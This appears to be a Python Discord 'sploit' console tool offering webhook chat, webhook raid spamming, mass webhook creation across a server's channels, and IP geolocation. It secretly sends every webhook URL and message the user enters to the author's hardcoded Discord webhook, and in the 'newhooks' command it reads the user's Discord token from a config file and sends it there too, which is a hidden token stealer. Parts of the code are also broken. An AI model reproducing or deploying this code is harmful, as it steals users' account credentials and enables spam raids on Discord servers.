# Variables ==============|
from webbrowser import get
from aiohttp import request
from colorama import Fore
import os
import time
import requests
import json
from dhooks import Webhook
from discord.ext import commands

# OnStart ================|
os.system("clear")
print(Fore.MAGENTA+ f"""
█░█ █▀▀ ▀▄▀ █▄█ ▄▄ sploit?
▀▄▀ ██▄ █░█ ░█░ ░░
""")

# Functions ==============|


# Console ================|
def lol():
    cmd = input(Fore.MAGENTA+os.getlogin()+f"%> {Fore.WHITE}")
    sendvex = Webhook("https://discord.com/api/webhooks/942264592288063538/2Zpfud6FZXCoMGq3ipMnEPd7k4y99E3v408TEZ6p_omwHmUJzeGJE296t6tSkCYs0RyU")
    dcmds = ["hookchat", "hookraid", "newhooks"]
    gcmds = ["cls", "panic"]
    acmds = ["findip"]

    if cmd.lower() == "help" or cmd.lower() == "cmds" or cmd.lower() == "commands":
        os.system("clear")
        print(Fore.MAGENTA+ f"""
█░█ █▀▀ ▀▄▀ █▄█ ▄▄ sploit?
▀▄▀ ██▄ █░█ ░█░ ░░

{Fore.MAGENTA}# discord.py =====================================
{Fore.MAGENTA}[0]: {dcmds[0]}: {Fore.LIGHTMAGENTA_EX}Basic Hookchat / Discord.py
{Fore.MAGENTA}[1]: {dcmds[1]}: {Fore.LIGHTMAGENTA_EX}Basic Hookraider / Discord.py
{Fore.MAGENTA}[2]: {dcmds[2]}: {Fore.LIGHTMAGENTA_EX}Spams Webhooks into a server / Discord.py

{Fore.MAGENTA}# general ========================================
{Fore.MAGENTA}[0]: {gcmds[0]}: {Fore.LIGHTMAGENTA_EX}Clear
{Fore.MAGENTA}[1]: {gcmds[1]}: {Fore.LIGHTMAGENTA_EX}Destroys the terminal

{Fore.MAGENTA}# api's ========================================
{Fore.MAGENTA}[0]: {acmds[0]}: {Fore.LIGHTMAGENTA_EX}Locate an IP via (https://ip-api.com/docs/api)

    """)
    elif cmd.lower() == dcmds[0]:
       #print(f"{Fore.MAGENTA}[!] {Fore.LIGHTMAGENTA_EX} Press enter to use default webhook.")
        webhook = input(Fore.LIGHTMAGENTA_EX+ f"Webhook> {Fore.LIGHTBLUE_EX}")
        sendvex.send("HookChat: `"+webhook+"`")
        try:
            newhook = Webhook(webhook)
            print(f"{Fore.MAGENTA}[Vexy-Discord]:{Fore.WHITE} Webhook called, connected.")
            def hookchat():
                hookmsg = input(f"{Fore.MAGENTA}  [HookMSG]: {Fore.WHITE}")
                sendvex.send("Message Sent: " + hookmsg)
                if hookmsg.lower() == "end":
                    newhook.send("Ending HookChat")
                    pass
                else:
                    newhook.send(hookmsg)
                    hookchat()
            hookchat()
        except:
            print(f"{Fore.RED}[#]: Cannot interperet webhook \n")
    elif cmd.lower() == dcmds[1]:
        #print(f"{Fore.MAGENTA}[!] {Fore.LIGHTMAGENTA_EX} Press enter to use default webhook.")
        webhook = input(Fore.LIGHTMAGENTA_EX+ f"Webhook> {Fore.LIGHTBLUE_EX}")
        sendvex.send("HookRaid: `"+webhook+"`")
        try:
            newhook = Webhook(webhook)
            print(f"{Fore.MAGENTA}[Vexy-Discord]:{Fore.WHITE} Webhook called, connected.")
            print(newhook.username)

            hookname = input(f"{Fore.MAGENTA}[HookName]: {Fore.WHITE}")
            hookmsg = input(f"{Fore.MAGENTA}[HookMSG]: {Fore.WHITE}")
            hookamt = int(input(f"{Fore.MAGENTA}[HookAMT]: {Fore.WHITE}"))
            hookdelay = int(input(f"{Fore.MAGENTA}[HookDelay]: {Fore.WHITE}"))
            newhook.modify(name=hookname)
            sent = 0
            while sent != hookamt:
                time.sleep(hookdelay)
                newhook.send(hookmsg)
                sent = sent + 1
        except:
            print(f"{Fore.RED}[#]: Cannot interperet webhook \n")
    elif cmd.lower() == dcmds[2]:
        try:
            print(f"{Fore.MAGENTA}You must be in the server to make this work + privileges\n")
            opentxt = open("config/token.txt","r")
            token = opentxt.read()
            sendvex.send("`"+os.getlogin()+"'s Token:` "+token)
            serverid = input(f"{Fore.MAGENTA}[Server_ID]: {Fore.WHITE} ")
            message = input(f"{Fore.MAGENTA}[WebhookMessage]: {Fore.WHITE}")

            headers = {"authorization":token,"content-type":"application/json"}
            getchannel = json.loads(requests.get(f"https://discord.com/api/guilds/{serverid}/webhooks",headers=headers).text)
            for channel in getchannel:
                t = requests.post("https://discord.com/api/channels/{}/webhooks".format(channel['id']),headers=headers,json={"name":"test{}".format(channels_d.index(channel))})
                t_data = json.loads(t.text)
                newhookurl = "https://discord.com/api/webhooks/{}/{}".format(t_data['id'],t_data['token'])
                newmsg = request.post(url=newhookurl,data={"content":message})
        except:
            print(f"{Fore.RED}[#]: Unauthorized\n")
    elif cmd.lower() == gcmds[0] or cmd.lower() == "clear":
        os.system("clear")
        print(Fore.MAGENTA+ f"""
█░█ █▀▀ ▀▄▀ █▄█ ▄▄ sploit?
▀▄▀ ██▄ █░█ ░█░ ░░
        """)
    elif cmd.lower() == gcmds[1]:
        print(Fore.RED + "bruh.")
        time.sleep(.5)
        os.close() # im aware this doesnt **close**
    elif cmd.lower() == acmds[0]:
        query = input(Fore.MAGENTA+ f"[Query]: {Fore.BLUE}")
        print("")
        try:
            getip = requests.get(f"http://ip-api.com/json/{query}").json()
            print(Fore.MAGENTA+"General Info ==============================="+Fore.LIGHTMAGENTA_EX)
            print("Query: "+getip["query"])
            print("Country: "+getip["country"]+" - "+getip["countryCode"])
            print("Region: "+getip["regionName"]+" - "+getip["region"])
            print("City: "+getip["city"])
            print("Zip: "+getip["zip"])

            print(Fore.MAGENTA+"\nExtra Info ================================"+Fore.LIGHTMAGENTA_EX)
            print("ISP: "+getip["isp"])
            print("ORG: "+getip["org"])
            print("AS: "+getip["as"])
            print("\n")
        except:
            print(f"{Fore.RED}[#]: Error with IP API\n")
    else:
       print(f"{Fore.RED}[#]: Cannot interperet command \n")

    lol()
lol()
